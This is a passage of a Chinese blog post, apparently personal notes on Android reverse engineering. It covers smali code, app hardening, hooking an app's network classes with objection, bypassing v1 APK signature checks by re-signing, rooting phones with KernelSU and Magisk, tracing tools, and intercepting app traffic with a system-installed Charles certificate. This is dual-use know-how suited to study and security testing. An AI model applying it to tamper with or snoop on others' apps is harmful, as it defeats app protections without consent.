v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    goto :goto_0</span><br><span class="line"></span><br><span class="line">    .line 37</span><br><span class="line">    :cond_0</span><br><span class="line">    const-string v0, &quot;\u767b\u5f55\u5931\u8d25&quot;  #登录失败</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;p0, v0, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    .line 38</span><br><span class="line">    :goto_0</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br></pre></td></tr></table></div></figure>

<p>其中<code>unicode</code>可以通过<code>cyberchef</code>进行确定</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230918110827822.png" alt="image-20230918110827822"></p>
<p>还有一些指令</p>
<ul>
<li>if-eqz vA, vB, :cond_”  如果vA等于vB则跳转到:<code>cond_</code></li>
<li>if-nez vA, vB, :cond_”  如果vA不等于vB则跳转到:<code>cond_</code></li>
</ul>

        <h2 id="代码混淆"   >
          <a href="#代码混淆" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h2>
      
        <h3 id="加固手法"   >
          <a href="#加固手法" class="heading-link"><i class="fas fa-link"></i></a><a href="#加固手法" class="headerlink" title="加固手法"></a>加固手法</h3>
      <ul>
<li><p>第一阶段：DEX整体加固</p>
<p>即将<code>DEX</code>整体加密后动态加载。加载时<code>DEX</code>加密文件整体解密后再用<code>DexClassLoader</code>或者其他类来加载解密后的文件。</p>
</li>
<li><p>第二阶段：代码抽取保护</p>
<p>函数真正的运行代码并不与<code>DEX</code>整体结构数据存储在一起，真正的加密核心原理为利用私有函数，通过对自身进程的<code>Hook</code>来拦截函数被调用的路径，在抽取的函数被真实调用之前，将无意义的代码数据填充到对应的代码区中，比如<code>nop</code>。</p>
<p>对抗工具有，<code>DexHunter</code></p>
</li>
<li><p>第三阶段：VMP与Dex2C</p>
<p>将所有的<code>JAVA</code>代码都变成最终的<code>Native</code>层代码(汇编)。</p>
</li>
</ul>

        <h3 id="常用工具"   >
          <a href="#常用工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3>
      <ul>
<li><p><code>ProGuard</code> ：更改类名，函数名，变量名，在<code>Android studio</code>中的根目录下面的<code>App/build.gradle</code>文件中，将<code>buildTypes</code>层级的<code>isMinifyEnabled</code>改为<code>True</code>即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230925171612027.png" alt="image-20230925171612027"></p>
</li>
<li><p><code>DexGuard</code>：除了<code>ProGuard</code>提供的功能外，还有字符串加密，花指令以及运行库防护等等。</p>
</li>
</ul>

        <h2 id="弹窗"   >
          <a href="#弹窗" class="heading-link"><i class="fas fa-link"></i></a><a href="#弹窗" class="headerlink" title="弹窗"></a>弹窗</h2>
      <p><code>Android</code>中常用的弹窗类主要有三种，分别是<code>android.App.Dialog</code>、<code>android.App.AlertDialog</code>和<code>android.widget.PopupWindow</code>，这些弹窗在打开<code>APP</code>运行起来之后，在内存中一般都有实例运行，那么找到这些实例即可。</p>

        <h2 id="HOOK抓包"   >
          <a href="#HOOK抓包" class="heading-link"><i class="fas fa-link"></i></a><a href="#HOOK抓包" class="headerlink" title="HOOK抓包"></a>HOOK抓包</h2>
      
        <h3 id="基础知识-1"   >
          <a href="#基础知识-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3>
      <p>主要是网络框架的知识，现在的大多网络通信框架有如下几种</p>
<ul>
<li><code>HttpURLConnect</code>：原生的<code>Android</code>网络通信框架</li>
<li><code>okhttp</code>、<code>Volley</code>、<code>WebSocket</code>、<code>XMPP</code>等：</li>
</ul>

        <h3 id="特定框架抓包"   >
          <a href="#特定框架抓包" class="heading-link"><i class="fas fa-link"></i></a><a href="#特定框架抓包" class="headerlink" title="特定框架抓包"></a>特定框架抓包</h3>
      <p>一般情况<code>Android</code>的收发包相关框架为<code>okhttp</code>、<code>okhttp3</code>、<code>HTTPURLConnection</code>三种框架，那么我们需要做的就是定位这三个框架调用到的类。</p>
<p>1.删除<code>~/.objection</code>目录，即删除旧的<code>objection.log</code>确保后面运行得到的日志只有本次<code>APP</code>的内容。</p>
<p>2.<code>Objection</code>附加进程<code>APP</code>，输入命令<code>android hooking list classes</code>获取加载的所有类，退出<code>objection</code></p>
<p>3.从<code>objection.log</code>中过滤出所有网络框架类<code>okhttp</code>、<code>okhttp3</code>、<code>HTTPURLConnection</code></p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat ./objection.log | grep -i HttpURLConnection &gt; htpc.txt</span><br><span class="line">cat ./objection.log | grep -i okhttp &gt; okhttp.txt</span><br><span class="line">cat ./objection.log | grep -i okhttp3 &gt; okhttp3.txt</span><br></pre></td></tr></table></div></figure>

<p>4.使用<code>vscode</code>补全导出的文件，<code>Alt+Shift+鼠标</code>向下拖动，可以选定所有行进行补全，使之成为一个<code>objection</code>命令</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230926103110130.png" alt="image-20230926103110130"></p>
<p>5.使用<code>objection</code>的<code>-c</code>选项对文件中所有命令进行执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230926103351414.png" alt="image-20230926103351414"></p>
<p>6.所有类都<code>hook</code>上之后，在<code>APP</code>上尝试登录，即可看到一堆执行的函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230926103631758.png" alt="image-20230926103631758"></p>
<p>7.任意选择上述被调用的函数，比如<code>com.android.okhttp.internal.http.StreamAllocation.release</code>，命令如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.cz.babySister explore</span><br><span class="line"> android hooking watch class_method com.android.okhttp.internal.http.StreamAllocation.release --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></div></figure>

<p>随后在<code>app</code>中尝试登录，出现如下调用栈</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230926104323943.png" alt="image-20230926104323943"></p>
<p>经过经验分析，可以得到最终的发包函数为<code>com.cz.babySister.c.a.a</code></p>

        <h2 id="签名校验-1"   >
          <a href="#签名校验-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#签名校验-1" class="headerlink" title="签名校验"></a>签名校验</h2>
      <p><code>APK</code>的签名作用通常用来证明<code>APK</code>所有者以及允许校验<code>APK</code>的正确性。</p>
<p>目前的<code>Android</code>支持如下四种签名方案</p>
<ul>
<li><p><code>v1</code> 方案：基于 <code>JAR</code> 签名。</p>
<p>这个签名机制主要就在 <code>META-INF </code>目录下的三个文件，<code>MANIFEST.MF，ANDROID.SF，ANDROID.RSA</code>，他们都是 <code>V1 </code>签名的产物。</p>
<ul>
<li><code>MANIFEST.MF</code>：摘要文件。签名时，程序遍历<code>Apk</code>包中的所有文件<code>(entry)</code>，对非文件夹非签名文件的文件，逐个用<code>SHA1</code>(安全哈希算法)生成摘要信息，再用<code>Base64</code>进行编码生成该摘要文件。如果改变了<code>APK</code>包中内容，那么这个<code>MANIFEST.MF</code>摘要文件在签名时就会发生改变。</li>
<li><code>ANDROID.SF</code>：签名文件。签名时对<code>MANIFEST.MF</code>摘要文件使用<code>SHA1-RSA</code>，用开发者的私钥进行加密(签名)生成该<code>ANDROID.SF</code>文件。在安装时或者打开应用某个功能时进行签名校验，用开发者的公钥对该签名文件<code>ANDROID.SF</code>进行解密，得到解密后的摘要文件<code>MANIFEST.MF_install</code>，使之与摘要文件<code>MANIFEST.MF</code>进行比对，如果内容相符，则代表该<code>APK</code>在签名时到安装这个过程中没有被修改，如果不相符，则被修改了，程序会无法安装，或者安装后闪退。</li>
<li><code>ANDROID.RSA</code>：密钥文件，保存了公钥以及所采用的加密算法等信息，上述验证过程中用到的公钥即在这个文件中，在签名时会一同导入到该文件。</li>
</ul>
<p>可以发现上述签名过程能保证的是在开发者签名之后的<code>APK</code>文件没被改变，但是如果我们将<code>APK</code>文件逆向反编译进行修改，然后用自己的私钥签名，再把自己的公钥放入<code>ANDROID.RSA</code>密钥文件中，在签名到签名校验这一个过程中<code>APK</code>文件并没有被改变，还是可以安装正常使用，也就绕过了<code>V1</code>方案。 </p>
</li>
<li><p><code>v2 </code>方案：<code>APK </code>签名方案<code> v2</code>（在<code>Android 7.0</code>中引入）</p>
</li>
<li><p><code>v3 </code>方案：<code>APK </code>签名方案 <code>v3</code>（在 <code>Android 9</code> 中引入）</p>
</li>
<li><p><code>v4</code> 方案：<code>APK</code> 签名方案 <code>v4</code>（在 <code>Android 11</code> 中引入）</p>
</li>
</ul>
<p>上述几种签名方案详细解读可以参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://source.android.com/docs/security/features/apksigning/v2?hl=zh-cn" >APK 签名方案 v2  | Android 开源项目  | Android Open Source Project</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>那么有签名大多都有签名校验，签名校验失败后通常有如下几种形式来讲应用停止<code>kill/killProcess、system.exit、finish</code></p>

        <h3 id="TIPS-1"   >
          <a href="#TIPS-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#TIPS-1" class="headerlink" title="TIPS"></a>TIPS</h3>
      <p>如果存在针对<code>okhttp</code>框架的混淆，则可以使用<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/siyujie/OkHttpLogger-Frida" >siyujie/OkHttpLogger-Frida: Frida 实现拦截okhttp的脚本 (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>来进行对抗</p>

        <h1 id="刷机"   >
          <a href="#刷机" class="heading-link"><i class="fas fa-link"></i></a><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1>
      
        <h2 id="Pixel4"   >
          <a href="#Pixel4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pixel4" class="headerlink" title="Pixel4"></a>Pixel4</h2>
      <p>首先进入<code>pixel4 kernelsu</code>的<code>github</code>，最新的即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928165853870.png" alt="image-20230928165853870"></p>
<p>查看<code>build number</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928165919610.png" alt="image-20230928165919610"></p>
<p>进入<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://developers.google.com/android/images#redfin%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84%E5%88%B7%E6%9C%BA%E5%8C%85%EF%BC%8C%E6%B3%A8%E6%84%8F%E8%A6%81%E6%98%AF%60pixel4%60%E6%89%8D%E8%A1%8C%EF%BC%8C%E7%82%B9%E5%87%BB%60link%60%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5" >https://developers.google.com/android/images#redfin，下载对应版本的刷机包，注意要是`pixel4`才行，点击`link`下载下来</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928170031221.png" alt="image-20230928170031221"></p>
<p><code>pixel4</code>关机之后按住音量减和电源键进入<code>fastboot</code>状态，会有红色感叹号的<code>fastboot</code>，，运行刷机包中的<code>./flash-all.sh</code>即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928170126928.png" alt="image-20230928170126928"></p>
<p>刷完之后，<code>github</code>上搜索对应机型的<code>kernelsu</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928165430069.png" alt="image-20230928165430069"></p>
<p><code>release</code>上下载<code>img</code>文件即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928165503450.png" alt="image-20230928165503450"></p>
<p>再关机，按住音量减和电源键进入<code>fastboot</code>状态，使用如下命令再刷入<code>flash</code>即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot flash boot pixel4xl_android13_4.14.276_v068.img</span><br></pre></td></tr></table></div></figure>

<p>刷完之后，重启即可。</p>
<p>然后再<code>github</code>上找<code>kernelsu</code>，进入<code>release</code>，下载对应版本的<code>apk</code>进行安装即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928165640320.png" alt="image-20230928165640320"></p>
<p>安装完成之后，即可使用<code>scrcpy</code>远程桌面，即可通过<code>kernelSu</code>进行管理</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928165727580.png" alt="image-20230928165727580"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928165736192.png" alt="image-20230928165736192"></p>

        <h2 id="红米note8Pro"   >
          <a href="#红米note8Pro" class="heading-link"><i class="fas fa-link"></i></a><a href="#红米note8Pro" class="headerlink" title="红米note8Pro"></a>红米note8Pro</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/360655776" >https://zhuanlan.zhihu.com/p/360655776</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="解锁BLM"   >
          <a href="#解锁BLM" class="heading-link"><i class="fas fa-link"></i></a><a href="#解锁BLM" class="headerlink" title="解锁BLM"></a>解锁BLM</h3>
      <p>查看教程，用的是官解</p>

        <h3 id="刷TWRP"   >
          <a href="#刷TWRP" class="heading-link"><i class="fas fa-link"></i></a><a href="#刷TWRP" class="headerlink" title="刷TWRP"></a>刷TWRP</h3>
      <p>用的是这个</p>
<p>小米全机型TWRP一键刷机工具：</p>
<p>百度网盘下载：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://pan.baidu.com/s/15lHG5eibrZ3nsS8CM_JVqg" >https://pan.baidu.com/s/15lHG5eibrZ3nsS8CM_JVqg</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 提取码：pc5n</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.romleyuan.com/lec/read?id=201" >http://www.romleyuan.com/lec/read?id=201</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>然后手机进入到Fastboot，运行刷机工具里面的.bat即可，就能进入到TWRP界面。</p>
<p>然后安装Magisk即可，需要后缀为.zip才行。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell twrp install /tmp/magisk.zip</span><br></pre></td></tr></table></div></figure>

<p>重启正常安装Magisk即可</p>

        <h1 id="壳"   >
          <a href="#壳" class="heading-link"><i class="fas fa-link"></i></a><a href="#壳" class="headerlink" title="壳"></a>壳</h1>
      
        <h2 id="查壳"   >
          <a href="#查壳" class="heading-link"><i class="fas fa-link"></i></a><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2>
      
        <h1 id="CTF题目"   >
          <a href="#CTF题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1>
      
        <h1 id="工具集合"   >
          <a href="#工具集合" class="heading-link"><i class="fas fa-link"></i></a><a href="#工具集合" class="headerlink" title="工具集合"></a>工具集合</h1>
      
        <h2 id="基础工具"   >
          <a href="#基础工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#基础工具" class="headerlink" title="基础工具"></a>基础工具</h2>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">工具名称</th>
<th align="left">描述</th>
<th align="left">链接</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Magisk</td>
<td align="left">获取root，管理root权限，管理模块</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/topjohnwu/Magisk" >Magisk</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left">LSPosed</td>
<td align="left">管理XPosed框架</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed" >LSPosed</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left">LSPatch</td>
<td align="left">用来将XPosed框架模块打包到APK</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPatch" >LSPatch</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left">MT管理器</td>
<td align="left">打包，重新签名，修改APK神器</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mt2.cn/" >MT管理器</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left">算法助手</td>
<td align="left">利用XPosed框架提供各种hook功能</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/Xposed-Modules-Repo/com.junge.algorithmaide" >算法助手</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left">开发助手</td>
<td align="left">主要用来查看布局情况</td>
<td align="left">手机商城就能下载</td>
</tr>
<tr>
<td align="left">XappDebug</td>
<td align="left">用来hook对应APP使其可以调试</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/Palatis/XAppDebug" >XappDebug</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
</tbody></table></div>

        <h2 id="调试工具"   >
          <a href="#调试工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#调试工具" class="headerlink" title="调试工具"></a>调试工具</h2>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">工具名称</th>
<th align="left">描述</th>
<th align="left">链接</th>
</tr>
</thead>
<tbody><tr>
<td align="left">JEB</td>
<td align="left">APK分析调试</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-279456.htm" >JEB5.5</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table></div>

        <h2 id="Trace工具"   >
          <a href="#Trace工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#Trace工具" class="headerlink" title="Trace工具"></a>Trace工具</h2>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">工具名称</th>
<th align="left">描述</th>
<th align="left">链接</th>
</tr>
</thead>
<tbody><tr>
<td align="left">jnitrace</td>
<td align="left">老牌，经典，信息全，携带方便</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/chame1eon/jnitrace" >jnitrace</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left">jnitrace-engine</td>
<td align="left">基于jnitrace，可定制化</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/chame1eon/jnitrace-engine" >jnitrace-engine</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left">jtrace</td>
<td align="left">定制方便，信息全面，直接在_agent.js或者_agent_stable.js 里面加自己的逻辑就行</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/SeeFlowerX/jtrace" >jtrace</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left">hook_art.js</td>
<td align="left">可提供jni trace，可以灵活的增加你需要hook的函数</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/lasting-yang/frida_hook_libart" >hook_art.js</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left">JNI-Frida-Hook</td>
<td align="left">函数名已定义，方便定位</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/Areizen/JNI-Frida-Hook" >JNI-Frida-Hook</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left">findhash</td>
<td align="left">ida插件，可用于检测加解密函数，也可作为Native Trace库</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/Pr0214/findhash" >findhash</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left">Stalker</td>
<td align="left">frida官方提供的代码跟踪引擎，可以在Native层方法级别，块级别，指令级别实现代码修改，代码跟踪</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://frida.re/docs/stalker/" >Stalker</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left">sktrace</td>
<td align="left">类似 ida 指令 trace 功能</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/bmax121/sktrace" >sktrace</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></td>
</tr>
<tr>
<td align="left">frida-qbdi-tracer</td>
<td align="left">速度比frida stalker快，免补环境</td>
<td align="left"><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/lasting-yang/frida-qbdi-tracer" >frida-qbdi-tracer</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>工具名称</td>
</tr>
</tbody></table></div>

        <h3 id="frida-trace"   >
          <a href="#frida-trace" class="heading-link"><i class="fas fa-link"></i></a><a href="#frida-trace" class="headerlink" title="frida-trace"></a>frida-trace</h3>
      <p>这个好像没有什么用，貌似是把所有的C相关函数都trace了，不太懂，也可能是用法不太对</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://frida.re/docs/frida-trace/" >官方文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>frida-trace 可以一次性监控一堆函数地址。还能打印出比较漂亮的树状图，不仅可以显示调用流程，还能显示调用层次。并且贴心的把不同线程调用结果用不同的颜色区分开了。<br>大佬整理的文档:<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://crifan.github.io/reverse_debug_frida/website/use_frida/frida_trace/" >frida-trace</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<ul>
<li><code>-i</code> / <code>-a</code>: 跟踪 C 函数或 so 库中的函数。<br>PS:-a 包含模块+偏移跟踪，一般用于追踪未导出函数，例子：-a “lib52pojie.so!0x4793c”</li>
</ul>
<p>包含/排除模块或函数：</p>
<ul>
<li><code>-I</code> : 包含指定模块。</li>
<li><code>-X</code> : 排除指定模块。</li>
</ul>
<p>Java 方法跟踪：</p>
<ul>
<li><code>-j JAVA_METHOD</code>: 包含 Java 方法。</li>
<li><code>-J JAVA_METHOD</code>: 排除 Java 方法。</li>
</ul>
<p>附加方式:</p>
<ul>
<li><code>-f</code>:通过 spwan 方式启动</li>
<li><code>-F</code>:通过 attach 方式附加当前进程</li>
</ul>
<p>日志输出:</p>
<ul>
<li><code>-o</code>:日志输出到文件</li>
</ul>
<p>示例：</p>
<p>frida为15.2.2</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -F -I &quot;lib52pojie.so&quot; -i &quot;Java_&quot; #附加当前进程并追踪lib52pojie.so里的所有Java_开头的jni导出函数</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240119140551996.png" alt="image-20240119140551996"></p>

        <h3 id="jnitrace"   >
          <a href="#jnitrace" class="heading-link"><i class="fas fa-link"></i></a><a href="#jnitrace" class="headerlink" title="jnitrace"></a>jnitrace</h3>
      <ul>
<li><p>版本</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida==16.1.4 ，python==3.9.9，jnitrace==3.3.0</span><br></pre></td></tr></table></div></figure></li>
</ul>
<p><code>l libnative-lib.so</code>- 用于指定要跟踪的库<br><code>-m &lt;spawn|attach&gt;</code>- 用于指定要使用的 Frida 附加机制<br><code>-i &lt;regex&gt;</code>- 用于指定应跟踪的方法名称，例如，<code>-i Get -i RegisterNatives</code>将仅包含名称中包含 Get 或 RegisterNatives 的 JNI 方法<br><code>-e &lt;regex&gt;</code>- 用于指定跟踪中应忽略的方法名称，例如，<code>-e ^Find -e GetEnv</code>将从结果中排除所有以 Find 开头或包含 GetEnv 的 JNI 方法名称<br><code>-I &lt;string&gt;</code>- 用于指定应跟踪的库的导出<br><code>-E &lt;string&gt;</code>用于指定不应跟踪的库的导出<br><code>-o path/output.json</code>- 用于指定<code>jnitrace</code>存储所有跟踪数据的输出路径</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jnitrace -m attach -l lib52pojie.so wuaipojie -o trace.json</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240119142721261.png" alt="image-20240119142721261"></p>
<p>有时候出错，多点两下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240119143101852.png" alt="image-20240119143101852"></p>

        <h3 id="sktrace"   >
          <a href="#sktrace" class="heading-link"><i class="fas fa-link"></i></a><a href="#sktrace" class="headerlink" title="sktrace"></a>sktrace</h3>
      <p>跑的比较慢，整体的trace</p>
<ul>
<li><p>版本：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida==16.1.4 ，python==3.9.9</span><br></pre></td></tr></table></div></figure></li>
</ul>
<ol>
<li>类似 ida 指令 trace 功能</li>
<li>统计寄存器变化，辅助分析，并且可能会有字符串产生</li>
</ol>
<figure class="highlight cmd"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sktrace.py -m attach -l lib52pojie.so -i <span class="number">0</span>x103B4 wuaipojie &gt; test.log</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240119143934575.png" alt="image-20240119143934575"></p>
<p>可以搜索字符串</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240119144241656.png" alt="image-20240119144241656"></p>

        <h1 id="抓包"   >
          <a href="#抓包" class="heading-link"><i class="fas fa-link"></i></a><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1>
      <p>需要用到<code>kali</code>中的<code>charles</code>软件，使用<code>charles</code>导出证书为<code>123.pem</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007100812480.png" alt="image-20231007100812480"></p>
<p>然后<code>push</code>进入证书，用户安装证书。之后需要使用<code>kernelSu</code>安装<code>Move_certificates</code><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/Magisk-Modules-Repo/movecert" >movecert</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，用来把用户证书放入到系统中，然后重启一下。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007101655837.png" alt="image-20231007101655837"></p>
<p>随后需要安装<code>postern</code>设置<code>vpn</code>，配置一下代理和规则即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007101753777.png" alt="image-20231007101753777"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007101835760.png" alt="image-20231007101835760"></p>
<p>现在就可以开始抓包了，使用<code>postern</code>打开<code>vpn</code>，然后在<code>kali</code>打开<code>charles</code>即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007102032081.png" alt="image-20231007102032081"></p>
<p>最终实现抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007102115385.png" alt="image-20231007102115385"></p>

        <h1 id="TIPS-2"   >
          <a href="#TIPS-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#TIPS-2" class="headerlink" title="TIPS"></a>TIPS</h1>
      
        <h2 id="1-AndroidKill修改签名"   >
